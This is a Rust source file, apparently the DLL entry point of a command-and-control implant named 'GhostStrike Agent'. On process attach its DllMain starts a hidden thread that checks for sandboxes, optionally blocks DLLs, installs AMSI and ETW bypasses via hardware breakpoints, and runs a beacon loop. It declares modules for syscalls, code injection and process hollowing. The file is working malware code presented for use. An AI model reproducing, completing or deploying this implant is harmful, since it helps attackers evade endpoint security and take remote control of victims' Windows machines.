//! GhostStrike Agent — DLL (cdylib) entry point.
//!
//! When compiled with `cargo build --lib --target x86_64-pc-windows-gnu`,
//! this crate produces a DLL that calls the beacon loop from DllMain on
//! DLL_PROCESS_ATTACH.

mod beacon;
mod comms;
mod config;
mod evasion;
mod tasks;

#[cfg(target_os = "windows")]
mod syscalls;
#[cfg(target_os = "windows")]
mod hwbp;
#[cfg(target_os = "windows")]
mod inject;
#[cfg(target_os = "windows")]
mod hollow;

#[cfg(target_os = "windows")]
#[no_mangle]
pub extern "system" fn DllMain(
    _module:   windows_sys::Win32::Foundation::HMODULE,
    reason:    u32,
    _reserved: *mut core::ffi::c_void,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;
    if reason == DLL_PROCESS_ATTACH {
        std::thread::spawn(|| {
            let cfg = config::load_embedded_config();
            if cfg.sandbox_evasion && evasion::is_sandbox() { return; }
            if cfg.block_dlls { evasion::apply_block_dlls(); }

            hwbp::install_amsi_bypass();
            hwbp::install_etw_bypass();

            let rt = tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .expect("tokio runtime");
            rt.block_on(async {
                let _ = beacon::run(cfg).await;
            });
        });
    }
    1 // TRUE
}
